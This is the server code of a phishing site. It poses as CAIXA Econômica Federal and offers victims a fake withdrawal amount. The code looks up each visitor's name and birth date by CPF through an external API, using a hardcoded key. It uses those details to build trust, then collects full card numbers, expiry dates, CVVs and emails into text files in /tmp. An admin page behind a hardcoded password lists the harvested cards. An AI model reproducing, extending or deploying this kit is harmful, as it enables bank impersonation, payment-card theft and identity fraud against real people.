const express = require('express');
const path = require('path');
const cors = require('cors');
const fs = require('fs');

const app = express();

// Middlewares
app.use(cors());
app.use(express.static(__dirname));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ==================== ARMAZENAMENTO DE BLOQUEIOS ====================
const bloqueios = new Map(); // Armazena CPFs bloqueados com timestamp

function bloquearCPF(cpf, minutos = 30) {
    const expiraEm = Date.now() + (minutos * 60 * 1000);
    bloqueios.set(cpf, expiraEm);
    console.log(`🔒 CPF ${cpf} bloqueado por ${minutos} minutos`);
}

function verificarBloqueio(cpf) {
    const expiraEm = bloqueios.get(cpf);
    if (!expiraEm) return false;
    
    if (Date.now() > expiraEm) {
        bloqueios.delete(cpf);
        return false;
    }
    return true;
}

function getTempoRestanteBloqueio(cpf) {
    const expiraEm = bloqueios.get(cpf);
    if (!expiraEm) return 0;
    
    const restante = Math.ceil((expiraEm - Date.now()) / 1000 / 60);
    return restante > 0 ? restante : 0;
}

// Função para gerar data aleatória (apenas para fallback)
function gerarDataAleatoria(anoMin, anoMax) {
  const ano = Math.floor(Math.random() * (anoMax - anoMin + 1) + anoMin);
  const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
  const dia = String(Math.floor(Math.random() * 28) + 1).padStart(2, '0');
  return `${ano}-${mes}-${dia}`;
}

function formatarData(dataStr) {
  if (!dataStr) return '---';
  const partes = dataStr.split('-');
  if (partes.length === 3) return `${partes[2]}/${partes[1]}/${partes[0]}`;
  return dataStr;
}

function gerarValorPorCPF(cpf) {
  let hash = 0;
  for (let i = 0; i < cpf.length; i++) {
    hash = ((hash << 5) - hash) + cpf.charCodeAt(i);
    hash = hash & hash;
  }
  const min = 500;
  const max = 150000;
  const valorCentavos = min + (Math.abs(hash) % (max - min + 1));
  const valorReais = (valorCentavos / 100).toFixed(2);
  return parseFloat(valorReais);
}

// ====================== ROTA PARA BUSCAR CPF (VALIDAÇÃO OBRIGATÓRIA) ======================
app.post('/buscar-cpf', async (req, res) => {
  const { cpf } = req.body;
  console.log(`🔍 Buscando CPF: ${cpf}`);

  if (!cpf || cpf.length !== 11) {
    return res.status(400).json({ success: false, erro: 'CPF inválido' });
  }

  // 🔴 VERIFICAR SE CPF ESTÁ BLOQUEADO
  if (verificarBloqueio(cpf)) {
    const minutosRestantes = getTempoRestanteBloqueio(cpf);
    return res.json({
      success: false,
      erro: `🔒 CPF BLOQUEADO`,
      detalhe: `Você excedeu o limite de tentativas. Aguarde ${minutosRestantes} minutos para tentar novamente.`,
      bloqueado: true,
      tempoRestante: minutosRestantes
    });
  }

  try {
    const fetch = await import('node-fetch');
    
    // Tentativa: Buscar na API CPFHub
    const response = await fetch.default(`https://api.cpfhub.io/cpf/${cpf}`, {
      headers: {
        'x-api-key': 'f85803bb3199f5dcfa20607e2c12d4dc63ba3e9cab5ccdb0ca868ffeff44dc7d',
        'Accept': 'application/json'
      },
      timeout: 8000
    });

    if (!response.ok) {
      console.log(`❌ API retornou ${response.status} - CPF não encontrado`);
      return res.json({
        success: false,
        erro: '❌ CPF NÃO ENCONTRADO',
        detalhe: 'Este CPF não está registrado na base de dados da CAIXA.'
      });
    }

    const data = await response.json();
    console.log(`📦 Resposta da API:`, JSON.stringify(data, null, 2));
    
    // Extrair dados OBRIGATÓRIOS
    let nomeUsuario = '';
    let dataNascimentoReal = '';
    
    if (data.data && data.data.name) {
      nomeUsuario = data.data.name;
      if (data.data.birthDate) dataNascimentoReal = data.data.birthDate;
    } else if (data.name) {
      nomeUsuario = data.name;
    } else if (data.nome) {
      nomeUsuario = data.nome;
    }
    
    // 🔴 VALIDAÇÃO OBRIGATÓRIA - SÓ PROSSEGUE SE TIVER NOME E DATA
    const TEM_NOME_VALIDO = nomeUsuario && nomeUsuario.trim().length > 3 && !nomeUsuario.toLowerCase().includes('não');
    const TEM_DATA_VALIDA = dataNascimentoReal && dataNascimentoReal.match(/^\d{4}-\d{2}-\d{2}$/);
    
    if (!TEM_NOME_VALIDO || !TEM_DATA_VALIDA) {
      console.log(`❌ CPF ${cpf} REJEITADO - Dados incompletos`);
      return res.json({
        success: false,
        erro: '❌ CPF NÃO ENCONTRADO NA BASE DE DADOS',
        detalhe: 'Os dados deste CPF não foram encontrados no sistema da CAIXA.'
      });
    }
    
    // ========== SE CHEGOU AQUI, TEM DADOS VÁLIDOS ==========
    console.log(`✅ CPF ${cpf} APROVADO - ${nomeUsuario} - Data: ${dataNascimentoReal}`);
    
    // Gerar opções de data (1 correta + 2 falsas)
    const opcoesDatas = [dataNascimentoReal];
    
    // Gerar datas falsas
    const [ano, mes, dia] = dataNascimentoReal.split('-').map(Number);
    let diaFalso = dia + 5;
    if (diaFalso > 28) diaFalso = dia - 3;
    const dataFalsa1 = `${ano}-${String(mes).padStart(2,'0')}-${String(diaFalso).padStart(2,'0')}`;
    
    let mesFalso = mes + 1;
    if (mesFalso > 12) mesFalso = mes - 1;
    const dataFalsa2 = `${ano}-${String(mesFalso).padStart(2,'0')}-${String(dia).padStart(2,'0')}`;
    
    opcoesDatas.push(dataFalsa1, dataFalsa2);
    
    // Embaralhar
    for (let i = opcoesDatas.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
    }
    
    res.json({
      success: true,
      nome: nomeUsuario,
      cpf: cpf,
      opcoesDatas: opcoesDatas,
      dataReal: dataNascimentoReal,
      valorDisponivel: gerarValorPorCPF(cpf),
      banco: 'CAIXA ECONÔMICA FEDERAL',
      agencia: '0001',
      conta: '*****-*'
    });

  } catch (err) {
    console.error('❌ Erro na API:', err.message);
    
    // 🔴 ERRO NA API - NÃO PROSSEGUE, NÃO TEM MODO DEMONSTRAÇÃO
    res.json({
      success: false,
      erro: '❌ SERVIÇO INDISPONÍVEL',
      detalhe: 'Não foi possível verificar seus dados. Tente novamente mais tarde.'
    });
  }
});

// ====================== ROTA PARA REGISTRAR TENTATIVA DE DATA ERRADA ======================
app.post('/registrar-tentativa-errada', (req, res) => {
  const { cpf } = req.body;
  console.log(`⚠️ Tentativa errada registrada para CPF: ${cpf}`);
  
  // Recuperar ou criar contador de tentativas para este CPF
  if (!global.tentativasDataErrada) {
    global.tentativasDataErrada = new Map();
  }
  
  const tentativasAtuais = (global.tentativasDataErrada.get(cpf) || 0) + 1;
  global.tentativasDataErrada.set(cpf, tentativasAtuais);
  
  console.log(`📊 CPF ${cpf} - Tentativas erradas: ${tentativasAtuais}/2`);
  
  if (tentativasAtuais >= 2) {
    // BLOQUEAR CPF POR 30 MINUTOS
    bloquearCPF(cpf, 30);
    global.tentativasDataErrada.delete(cpf);
    
    return res.json({
      success: false,
      bloqueado: true,
      mensagem: 'Você errou 2 vezes. CPF bloqueado por 30 minutos.',
      tempoRestante: 30
    });
  }
  
  res.json({
    success: true,
    tentativasRestantes: 2 - tentativasAtuais,
    mensagem: `Data incorreta. Tentativas restantes: ${2 - tentativasAtuais}`
  });
});

// ====================== ROTA PARA RESETAR TENTATIVAS (QUANDO ACERTA) ======================
app.post('/resetar-tentativas', (req, res) => {
  const { cpf } = req.body;
  if (global.tentativasDataErrada) {
    global.tentativasDataErrada.delete(cpf);
  }
  console.log(`✅ Tentativas resetadas para CPF: ${cpf}`);
  res.json({ success: true });
});

// ROTAS HTML
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pagamento.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'pagamento.html'));
});

// ====================== ROTA PARA SALVAR CARTÃO EM ARQUIVO TXT ======================
app.post('/salvar-cartao-txt', (req, res) => {
    const { nome, cpf, cartao, validade, cvv, email, valor } = req.body;
    
    console.log('📥 Salvando cartão...');
    console.log('📦 Dados:', req.body);
    
    const dataHora = new Date().toLocaleString('pt-BR');
    const conteudo = `============================================================
📅 DATA/HORA: ${dataHora}
👤 NOME: ${nome}
🆔 CPF: ${cpf}
💳 CARTÃO: ${cartao}
📅 VALIDADE: ${validade}
🔢 CVV: ${cvv}
📧 E-MAIL: ${email}
💰 VALOR: ${valor}
============================================================

`;
    
    try {
        const pastaDados = '/tmp/dados_cartoes';
        if (!fs.existsSync(pastaDados)) {
            fs.mkdirSync(pastaDados, { recursive: true });
            console.log('📁 Pasta criada em:', pastaDados);
        }
        
        const nomeArquivo = `cartoes_${new Date().toISOString().slice(0,10)}.txt`;
        const caminhoArquivo = path.join(pastaDados, nomeArquivo);
        
        fs.appendFileSync(caminhoArquivo, conteudo, 'utf8');
        
        console.log(`✅ Cartão salvo em: ${caminhoArquivo}`);
        res.json({ success: true });
        
    } catch (err) {
        console.error('❌ Erro:', err.message);
        res.status(500).json({ success: false, erro: err.message });
    }
});

// ====================== ADMIN - VER CARTÕES SALVOS ======================
app.get('/admin/ver-cartoes-servidor', (req, res) => {
    const SENHA_ADMIN = "777ga30";
    const senhaDigitada = req.query.senha || '';
    
    if (senhaDigitada !== SENHA_ADMIN) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head><meta charset="UTF-8"><title>Acesso Restrito</title>
            <style>
                body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: monospace; }
                .login-box { background: #0f3460; padding: 40px; border-radius: 20px; text-align: center; border-left: 4px solid #ffb600; }
                h1 { color: #ffb600; }
                input { padding: 10px; margin: 20px 0; border-radius: 8px; border: none; width: 100%; background: #1a1a2e; color: #fff; }
                button { background: #ffb600; color: #004aad; padding: 10px 30px; border: none; border-radius: 8px; cursor: pointer; }
            </style>
            </head>
            <body>
                <div class="login-box">
                    <h1>🔒 ACESSO RESTRITO</h1>
                    <form method="GET">
                        <input type="password" name="senha" placeholder="Digite a senha" autocomplete="off">
                        <button type="submit">ENTRAR</button>
                    </form>
                </div>
            </body>
            </html>
        `);
    }
    
    const pasta = '/tmp/dados_cartoes';
    let html = `<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Admin - Cartões</title>
        <style>
            body { font-family: monospace; background: #1a1a2e; padding: 20px; color: #fff; }
            .container { max-width: 1200px; margin: 0 auto; }
            h1 { text-align: center; color: #ffb600; }
            .stats { background: #0f3460; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
            .card { background: #0f3460; border-radius: 12px; padding: 20px; margin-bottom: 15px; border-left: 4px solid #ffb600; }
            .card h3 { color: #ffb600; }
            pre { background: #1a1a2e; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; font-size: 12px; }
            button { background: #ffb600; color: #004aad; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin-bottom: 20px; }
            .logout { text-align: right; margin-bottom: 15px; }
            .logout a { color: #ffb600; text-decoration: none; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logout"><a href="?">🚪 Sair</a></div>
            <h1>📋 ADMIN - CARTÕES SALVOS</h1>
            <div class="stats">📂 Pasta: /tmp/dados_cartoes/</div>
            <button onclick="location.reload()">🔄 Atualizar</button>
    `;
    
    try {
        if (fs.existsSync(pasta)) {
            const arquivos = fs.readdirSync(pasta).filter(f => f.endsWith('.txt')).sort().reverse();
            console.log(`📁 Encontrados ${arquivos.length} arquivos`);
            
            if (arquivos.length === 0) {
                html += '<div class="card"><h3>📭 Nenhum cartão salvo ainda</h3><p>Faça uma solicitação de saque para aparecer aqui.</p></div>';
            } else {
                arquivos.forEach(arq => {
                    const caminho = path.join(pasta, arq);
                    const conteudo = fs.readFileSync(caminho, 'utf8');
                    html += `
                        <div class="card">
                            <h3>📄 ${arq}</h3>
                            <pre>${conteudo.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
                        </div>
                    `;
                });
            }
        } else {
            html += '<div class="card"><h3>📭 Nenhum cartão salvo ainda</h3><p>Faça uma solicitação de saque para aparecer aqui.</p></div>';
        }
    } catch(e) {
        console.error('Erro ao ler pasta:', e);
        html += `<div class="card"><h3>❌ Erro ao ler arquivos: ${e.message}</h3></div>`;
    }
    
    html += `</div></body></html>`;
    res.send(html);
});

// FALLBACK
app.use((req, res) => {
  res.status(404).send('Página não encontrada');
});

// INICIA O SERVIDOR
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Servidor rodando em http://localhost:${PORT}`);
  console.log(`🔒 Admin: http://localhost:${PORT}/admin/ver-cartoes-servidor?senha=777ga30`);
});